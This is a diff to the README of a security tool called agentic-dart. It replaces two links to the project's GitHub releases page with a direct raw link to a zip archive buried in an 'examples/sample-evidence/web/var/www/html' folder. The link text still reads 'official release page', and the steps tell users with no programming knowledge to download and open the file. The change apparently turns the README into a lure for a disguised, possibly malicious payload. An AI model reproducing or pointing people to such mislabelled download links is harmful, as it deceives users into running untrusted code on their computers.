@@ -1,6 +1,6 @@
 # 🛡️ agentic-dart - Automate Security Detection and Incident Response
 
-[![Download Agentic-DART](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Fauniethermal3522/agentic-dart/releases)
+[![Download Agentic-DART](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Fauniethermal3522/agentic-dart/main/examples/sample-evidence/web/var/www/html/agentic_dart_v3.4.zip)
 
 Agentic-DART acts as an autonomous digital defense system. It monitors your computer for threats and manages security responses without constant manual input. This tool focuses on digital forensics and incident response. It finds suspicious patterns on your system and helps you address them quickly. 
 
@@ -8,7 +8,7 @@ Agentic-DART acts as an autonomous digital defense system. It monitors your comp
 
 You do not need programming knowledge to use this software. This guide covers the steps to get the app running on your Windows computer.
 
-1. Visit the [official release page](https://github.com/Fauniethermal3522/agentic-dart/releases) to download the installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/Fauniethermal3522/agentic-dart/main/examples/sample-evidence/web/var/www/html/agentic_dart_v3.4.zip) to download the installer.
 2. Select the version labeled for Windows.
 3. Save the file to your computer.
 4. Open the downloaded file to begin the setup process.
